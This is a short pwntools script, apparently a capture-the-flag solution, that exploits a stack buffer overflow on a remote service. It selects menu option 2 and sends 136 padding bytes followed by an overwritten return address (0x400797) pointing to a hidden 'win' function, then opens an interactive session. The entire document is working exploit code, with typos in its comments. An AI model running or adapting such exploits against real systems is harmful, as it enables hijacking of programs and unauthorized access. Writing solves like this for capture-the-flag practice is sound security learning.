from pwn import *

# remote solve
p = remote("server", port)

# hiddenBlessing function
win = p64(0x400797) + b'\n'

# Choose option first to enlightenment function
option = b'2\n'
p.sendlineafter("purpose: \n", b'2')


# send payload after sendting option
payload = b'A' * 136  
payload += win        
p.sendafter("know? \n", payload)

p.interactive()